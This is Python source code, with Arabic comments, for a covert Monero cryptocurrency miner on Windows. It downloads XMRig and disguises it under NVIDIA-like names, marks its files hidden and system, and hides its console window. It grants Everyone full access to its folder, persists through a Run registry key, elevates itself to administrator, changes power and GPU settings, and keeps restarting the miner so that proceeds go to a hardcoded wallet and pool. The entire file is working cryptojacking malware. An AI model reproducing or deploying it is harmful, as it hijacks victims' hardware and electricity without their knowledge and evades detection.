import os
import ctypes
import urllib.request
import zipfile
import shutil
import subprocess
import json
import time
import psutil
import sys
import winreg
import wmi

# إعدادات التعدين
CONFIG = {
    "wallet": "475pCYWcerqS1q1dWuKT9WQ3TPfQ6Npbnb41N8mLVSMc8nSoUBWwn6ecErZEaqF4MhGXk9LtaZHguQWzeanxyFmKLtZofFF",
    "pool": "gulf.moneroocean.stream:20128",
    "worker_name": os.getenv("COMPUTERNAME", "GPU_RIG"),
    "cpu_intensity": 50,
    "nvidia_intensity": 70,
    "amd_intensity": 65
}

# تغيير المسار إلى مكان له أذونات كاملة
WORK_DIR = os.path.join(os.environ['LOCALAPPDATA'], "NVIDIA_Display_Control")  # اسم مخفي
os.makedirs(WORK_DIR, exist_ok=True)

MINER_EXE = os.path.join(WORK_DIR, "nvcontainer.exe")  # اسم مخفي
CONFIG_FILE = os.path.join(WORK_DIR, "settings.dat")   # ملف إعدادات مخفي
LOG_FILE = os.path.join(WORK_DIR, "debug.log")         # سجلات

class GPUMiner:
    def __init__(self):
        self.process = None
        self.wmi = wmi.WMI()
        self.gpu_type = self.detect_gpu()
        
    def detect_gpu(self):
        """الكشف عن نوع كرت الشاشة"""
        try:
            for gpu in self.wmi.Win32_VideoController():
                if "NVIDIA" in gpu.Name:
                    return "NVIDIA"
                elif "AMD" in gpu.Name or "Radeon" in gpu.Name:
                    return "AMD"
            return None
        except Exception as e:
            self.log_error(f"GPU detection failed: {e}")
            return None
    
    def setup_environment(self):
        """تهيئة البيئة التشغيلية"""
        try:
            # إخفاء نافذة الكونسول
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            # منح صلاحيات كاملة للمجلد
            self.fix_permissions()
            
            if not os.path.exists(MINER_EXE):
                self.download_miner()
                
            self.create_config()
            self.add_to_startup()
            self.optimize_system()
            return True
        except Exception as e:
            self.log_error(f"Setup failed: {e}")
            return False
    
    def fix_permissions(self):
        """إصلاح أذونات المجلد"""
        try:
            if os.path.exists(WORK_DIR):
                subprocess.run(f'icacls "{WORK_DIR}" /grant *S-1-1-0:(OI)(CI)F /T', 
                             shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            self.log_error(f"Permission fix failed: {e}")
    
    def download_miner(self):
        """تنزيل برنامج التعدين"""
        temp_dir = os.path.join(os.environ["TEMP"], "nvidia_update")
        os.makedirs(temp_dir, exist_ok=True)
        
        try:
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-msvc-win64.zip"
            zip_path = os.path.join(temp_dir, "update.zip")
            
            # استخدام وكيل عشوائي
            proxy_handler = urllib.request.ProxyHandler({})
            opener = urllib.request.build_opener(proxy_handler)
            urllib.request.install_opener(opener)
            
            urllib.request.urlretrieve(url, zip_path)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            src = os.path.join(temp_dir, "xmrig-6.21.1", "xmrig.exe")
            shutil.copy2(src, MINER_EXE)
            self.hide_file(MINER_EXE)
            
        except Exception as e:
            self.log_error(f"Download failed: {e}")
            raise
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    def create_config(self):
        """إنشاء ملف إعدادات التعدين"""
        config = {
            "autosave": True,
            "cpu": {
                "enabled": True,
                "max-threads-hint": CONFIG["cpu_intensity"],
                "priority": 3
            },
            "opencl": {
                "enabled": self.gpu_type in ["AMD", "NVIDIA"],
                "intensity": CONFIG["amd_intensity"] if self.gpu_type == "AMD" else CONFIG["nvidia_intensity"]
            },
            "cuda": {
                "enabled": self.gpu_type == "NVIDIA",
                "intensity": CONFIG["nvidia_intensity"]
            },
            "donate-level": 1,
            "pools": [{
                "url": CONFIG["pool"],
                "user": f"{CONFIG['wallet']}.{CONFIG['worker_name']}",
                "pass": "x",
                "keepalive": True,
                "tls": True
            }]
        }
        
        try:
            # التأكد من الأذونات قبل الكتابة
            if not os.access(WORK_DIR, os.W_OK):
                self.fix_permissions()
                
            with open(CONFIG_FILE, "w") as f:
                json.dump(config, f, indent=4)
            self.hide_file(CONFIG_FILE)
        except Exception as e:
            self.log_error(f"Config creation failed: {e}")
            raise
    
    def add_to_startup(self):
        """إضافة للتشغيل التلقائي عبر الريجستري"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "NVIDIA_Display_Service", 0, winreg.REG_SZ, sys.executable)
            return True
        except Exception as e:
            self.log_error(f"Registry error: {e}")
            return False
    
    def optimize_system(self):
        """تحسين إعدادات النظام للأداء"""
        try:
            # استبدال WMIC بأمر Powercfg أكثر أماناً
            subprocess.run("powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", 
                         shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if self.gpu_type == "NVIDIA":
                try:
                    subprocess.run("nvidia-smi -pl 90", 
                                 shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass  # تجاهل إذا فشل
            elif self.gpu_type == "AMD":
                try:
                    subprocess.run("amdconfig --set-profile=1", 
                                 shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass  # تجاهل إذا فشل
                
        except Exception as e:
            self.log_error(f"Optimization failed: {e}")
    
    def start_mining(self):
        """بدء عملية التعدين"""
        try:
            # التأكد من وجود الملفات أولاً
            if not os.path.exists(MINER_EXE) or not os.path.exists(CONFIG_FILE):
                self.log_error("Missing miner files, restarting setup...")
                self.setup_environment()
                return False
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            self.process = subprocess.Popen(
                [MINER_EXE, "--config", CONFIG_FILE, "--no-color"],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                startupinfo=startupinfo,
                cwd=WORK_DIR,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.log_error("Miner started successfully")
            return True
        except Exception as e:
            self.log_error(f"Miner start failed: {e}")
            return False
    
    def monitor(self):
        """مراقبة واستمرارية التشغيل"""
        try:
            while True:
                if not self.process or self.process.poll() is not None:
                    self.log_error("Miner process stopped, restarting...")
                    if self.process:
                        self.process.terminate()
                    self.process = None
                    time.sleep(5)  # انتظار قبل إعادة التشغيل
                    self.start_mining()
                
                time.sleep(30)
                
        except KeyboardInterrupt:
            self.stop_mining()
        except Exception as e:
            self.log_error(f"Monitoring error: {e}")
    
    def stop_mining(self):
        """إيقاف التعدين"""
        try:
            if self.process:
                self.process.terminate()
                self.process.wait(timeout=10)
            self.log_error("Miner stopped")
        except Exception as e:
            self.log_error(f"Stop failed: {e}")
    
    def hide_file(self, path):
        """إخفاء الملفات/المجلدات"""
        try:
            ctypes.windll.kernel32.SetFileAttributesW(path, 2)
            # إضافة حماية إضافية
            subprocess.run(f'attrib +h +s +r "{path}"', shell=True, check=True)
        except:
            pass
    
    def log_error(self, message):
        """تسجيل الأخطاء"""
        try:
            # التأكد من وجود المجلد أولاً
            if not os.path.exists(WORK_DIR):
                os.makedirs(WORK_DIR)
                self.fix_permissions()
                
            with open(LOG_FILE, "a", encoding='utf-8') as f:
                f.write(f"[{time.ctime()}] {message}\n")
        except Exception as e:
            # إذا فشل التسجيل، طباعة في الكونسول
            print(f"Log failed: {message} - {e}")

if __name__ == "__main__":
    # تشغيل كمسؤول
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    miner = GPUMiner()
    if miner.setup_environment():
        miner.start_mining()
        miner.monitor()